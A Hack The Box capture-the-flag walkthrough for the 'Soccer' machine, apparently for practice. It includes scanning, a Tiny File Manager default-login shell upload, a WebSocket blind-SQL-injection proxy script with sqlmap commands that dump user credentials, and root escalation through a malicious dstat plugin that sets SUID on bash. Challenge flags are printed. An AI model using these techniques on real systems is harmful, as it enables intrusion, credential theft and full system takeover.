---
layout: default
---



* Hack the Box Machine Resources

** Here the solution of machines from Hack The Box

_The intention is to have a kind of guidance and specially for the commands and tools_\
_used. To fully understand some of this topics, require documentation, reading and_ _practice._

_This Game is about get the flag.txt from the user and from the root so._
---

### SOCCER

* Level: easy
* IP: 10.10.11.194


``` bash
 Nmap 7.93 scan initiated Sun Jan  8 18:38:28 2023 as: nmap -v -sV -A -Pn -oN scanSimple 10.10.11.194
Nmap scan report for 10.10.11.194
Host is up (0.078s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Sun, 08 Jan 2023 17:38:50 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Sun, 08 Jan 2023 17:38:50 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.93%I=7%D=1/8%Time=63BAFFA4%P=x86_64-pc-linux-gnu%r(inf
SF:ormix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\
SF:n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\n
SF:Content-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCon
SF:tent-Length:\x20139\r\nDate:\x20Sun,\x2008\x20Jan\x202023\x2017:38:50\x
SF:20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=
SF:\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</h
SF:ead>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(HTT
SF:POptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Poli
SF:cy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r
SF:\nDate:\x20Sun,\x2008\x20Jan\x202023\x2017:38:50\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<met
SF:a\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Ca
SF:nnot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"HTT
SF:P/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-sr
SF:c\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20t
SF:ext/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Sun,\x
SF:2008\x20Jan\x202023\x2017:38:50\x20GMT\r\nConnection:\x20close\r\n\r\n<
SF:!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"ut
SF:f-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\x
SF:20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r
SF:(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnecti
SF:on:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan  8 18:38:57 2023 -- 1 IP address (1 host up) scanned in 29.28 seconds







❯ wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://soccer.htb/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://soccer.htb/FUZZ
Total requests: 220561

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                       
=====================================================================

000000001:   200        147 L    526 W      6917 Ch     "# directory-list-2.3-medium.txt"             
000000011:   200        147 L    526 W      6917 Ch     "# Priority ordered case sensative list, where
                                                         entries were found"                          
000000009:   200        147 L    526 W      6917 Ch     "# Suite 300, San Francisco, California, 94105
                                                        , USA."                                       
000000007:   200        147 L    526 W      6917 Ch     "# license, visit http://creativecommons.org/l
                                                        icenses/by-sa/3.0/"                           
000000013:   200        147 L    526 W      6917 Ch     "#"                                           
000000010:   200        147 L    526 W      6917 Ch     "#"                                           
000000003:   200        147 L    526 W      6917 Ch     "# Copyright 2007 James Fisher"               
000000012:   200        147 L    526 W      6917 Ch     "# on atleast 2 different hosts"              
000000014:   200        147 L    526 W      6917 Ch     "http://soccer.htb/"                          
000000006:   200        147 L    526 W      6917 Ch     "# Attribution-Share Alike 3.0 License. To vie
                                                        w a copy of this"                             
000000004:   200        147 L    526 W      6917 Ch     "#"                                           
000000005:   200        147 L    526 W      6917 Ch     "# This work is licensed under the Creative Co
                                                        mmons"                                        
000000008:   200        147 L    526 W      6917 Ch     "# or send a letter to Creative Commons, 171 S
                                                        econd Street,"                                
000000002:   200        147 L    526 W      6917 Ch     "#"                                           
000000064:   301        7 L      12 W       178 Ch      "tiny"     




```

* We found "tiny" as a directory with wfuzz 
* Below we see and research about tiny file manager vulnerability  and in this case we can login with 
* default credentials
* look for this vulnerability and follow intructions to upload the file in the server and the open it
* And wait with pwncat

![image](./assets/img/tinyFileManagerGoogle.png)

![image](./assets/img/soccershell.png)

![image](./assets/img/soccershell1.png)


``` bash

(remote) www-data@soccer:/$ cat /etc/hosts                                                            
127.0.0.1	localhost	soccer	soccer.htb	soc-player.soccer.htb

127.0.1.1	ubuntu-focal	ubuntu-focal

(remote) www-data@soccer:/$    

```

* Add soc-player.soccer.htb to our /etc/hosts
* We should easily fall in this site

![image](./assets/img/soccerSoc-playerhtb.png)

the source code reveals this

``` bash
            <div class="price pt-3 pl-3">
                    <span class="mb-2">Price</span>
                        <h5>Free</h5>
                </div>
            </div>
            <p>** Please don't forget your ticket number. **</p>
        </div>
    </div>
    <script>
        var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
        window.onload = function () {
        
        var btn = document.getElementById('btn');
        var input = document.getElementById('id');
        
        ws.onopen = function (e) {
            console.log('connected to the server')
        }
        input.addEventListener('keypress', (e) => {
            keyOne(e)
      

```


FOLLOW: https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html
* pip install websocket
* pip3 install websocket-client


``` python

from http.server import SimpleHTTPRequestHandler
   2   │ from socketserver import TCPServer
   3   │ from urllib.parse import unquote, urlparse
   4   │ from websocket import create_connection
   5   │ 
   6   │ #ws_server = "ws://localhost:8156/ws"**CHANGE**
   7   │ ws_server = "ws://soc-player.soccer.htb:9091"
   8   │ 
   9   │ def send_ws(payload):
  10   │     ws = create_connection(ws_server)
  11   │     # If the server returns a response on connect, use below line   
  12   │     #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
  13   │       
  14   │     # For our case, format the payload in JSON
  15   │     message = unquote(payload).replace('"','\'') # replacing " with ' to avoi
       │ d breaking JSON structure
         # data = '{"employeeID":"%s"}' % message **CHANGE**
  16   │   data = '{"id":"%s"}' % message
  17   │ 
  18   │     ws.send(data)
  19   │     resp = ws.recv()
  20   │     ws.close()
  21   │ 
  22   │     if resp:
  23   │         return resp
  24   │     else:
  25   │         return ''

```
* In one terminal we fire the exploit
* In another terminal we fire the sqlmap as shown below

_terminal1_
```
❯ python3 sqliserver.py
```
_terminal2_
```
❯ sqlmap -u "http://localhost:8081/?id=1" -p "id" --dbs
```
![image](./assets/img/sqliServerExploit.png)


``` bash
❯ sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -tables
```

``` bash
[20:20:54] [INFO] retrieved: 
[20:21:05] [INFO] adjusting time delay to 2 seconds due to good response times
accounts
Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+
´´´
``` bash
❯ sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -T accounts -columns
```

``` bash
[20:28:54] [INFO] retrieved: 
[20:29:05] [INFO] adjusting time delay to 2 seconds due to good response times
email
[20:29:41] [INFO] retrieved: varchar(40)
[20:31:25] [INFO] retrieved: id
[20:31:44] [INFO] retrieved: int
[20:32:16] [INFO] retrieved: password
[20:33:34] [INFO] retrieved: varchar(40)
[20:35:16] [INFO] retrieved: username
[20:36:24] [INFO] retrieved: varchar(40)
Database: soccer_db
Table: accounts
[4 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| email    | varchar(40) |
| id       | int         |
| password | varchar(40) |
| username | varchar(40) |
+----------+-------------+

```

``` bash
❯ sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -T accounts -C username,password -dump
```
``` bash
[20:42:01] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
[20:42:29] [INFO] adjusting time delay to 3 seconds due to good response times
PlayerOftheMatch2022
[20:46:15] [INFO] retrieved: player
Database: soccer_db
Table: accounts
[1 entry]
+----------+----------------------+
| username | password             |
+----------+----------------------+
| player   | PlayerOftheMatch2022 |
+----------+----------------------+
```
``` bash
❯ ssh player@10.10.11.194
The authenticity of host '10.10.11.194 (10.10.11.194)' can't be established.
ED25519 key fingerprint is SHA256:PxRZkGxbqpmtATcgie2b7E8Sj3pw1L5jMEqe77Ob3FE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.194' (ED25519) to the list of known hosts.
player@10.10.11.194's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jan 11 19:48:38 UTC 2023

  System load:           0.0
  Usage of /:            70.3% of 3.84GB
  Memory usage:          26%
  Swap usage:            0%
  Processes:             240
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.194
  IPv6 address for eth0: dead:beef::250:56ff:feb9:457a

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jan 11 18:10:14 2023 from 10.10.14.82
-bash-5.0$ id
uid=1001(player) gid=1001(player) groups=1001(player)
-bash-5.0$ pwd
/home/player
-bash-5.0$ ls -la
total 44
drwxr-xr-x 6 player player 4096 Jan 11 18:19 .
drwxr-xr-x 3 root   root   4096 Nov 17 09:25 ..
lrwxrwxrwx 1 root   root      9 Nov 17 09:02 .bash_history -> /dev/null
-rw-r--r-- 1 player player  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 player player 3771 Feb 25  2020 .bashrc
drwx------ 2 player player 4096 Nov 17 09:00 .cache
drwx------ 3 player player 4096 Jan 11 17:48 .gnupg
drwxrwxr-x 3 player player 4096 Jan 11 18:10 .local
-rw-r--r-- 1 player player  807 Feb 25  2020 .profile
-rw------- 1 player player 3783 Jan 11 18:19 .viminfo
drwx------ 3 player player 4096 Jan 11 17:45 snap
-rw-r----- 1 root   player   33 Jan 11 17:20 user.txt
-bash-5.0$ cat user.txt 
d4b703352cd192b19e6983733bcf72c2
-bash-5.0$ 
```
Looking for binaries suid we found this _doas_?

``` bash
-bash-5.0$ find / -perm -4000 2>/dev/null
**/usr/local/bin/doas**
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/umount
/usr/bin/fusermount
...

-bash-5.0$ 
```
We end up finding
* /usr/local/etc/doas.conf
* We can execute dstat as root with no password
``` bash
bash-5.0$ cat doas.conf 
permit nopass player as root cmd /usr/bin/dstat
bash-5.0$ / 
```
``` bash
ash-5.0$  doas -u root /usr/bin/dstat
You did not select any stats, using -cdngy by default.
Color support is disabled as curses does not find terminal "xterm-kitty".
--total-cpu-usage-- -dsk/total- -net/total- ---paging-- ---system--
usr sys idl wai stl| read  writ| recv  send|  in   out | int   csw 
  2   1  97   0   0|  56k   17k|   0     0 |   0     0 | 349   577 
  0   0 100   0   0|   0     0 | 198B  310B|   0     0 | 264   495 
  0   0  99   0   0|   0     0 | 272B  325B|   0     0 | 246   489 
  1   0  99   0   0|   0     0 |  66B  174B|   0     0 | 228   458 
  1   0  99   0   0|   0     0 | 254B  348B|   0     0 | 267   490 
  0   1  99   0   0|   0    40k|  66B  174B|   0     0 | 242   462 
  0   0  99   0   0|   0     0 |  66B  174B|   0     0 | 230   456 
  1   0  99   0   0|   0     0 |  66B  174B|   0     0 | 246   469 
  0   1  99   0   0|   0     0 |  66B  174B|   0     0 | 233   458 
  0   1  99   1   0|   0   604k|  66B  174B|   0     0 | 328   520 ^C
bash-5.0$ 

```
* We have write permissions in /usr/local/share/dstat 
* This is the directory plugins are stored
``` bash
bash-5.0$ ls -la /usr/local/share/dstat
total 8
drwxrwx--- 2 root player 4096 Jan 11 18:21 .
drwxr-xr-x 6 root root   4096 Nov 17 09:16 ..
bash-5.0$ 
```
* We create a plugin as so 
* Then we execute it as root

``` bash
bash-5.0$ echo 'import os;os.system("chmod u+s /bin/bash")' > dstat_privesc.py
bash-5.0$ ls
dstat_privesc.py  snap	user.txt
bash-5.0$ doas -u root /usr/bin/dstat --privesc &>/dev/null
bash-5.0$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
bash-5.0$ bash -p
bash-5.0# whoami
root
```
``` bash
bash-5.0# pwd
/root
bash-5.0# ls
app  root.txt  run.sql	snap
bash-5.0# cat root.txt 
be6452f04ab32a00e90f437dffc6cb94
```

And we've got the flag!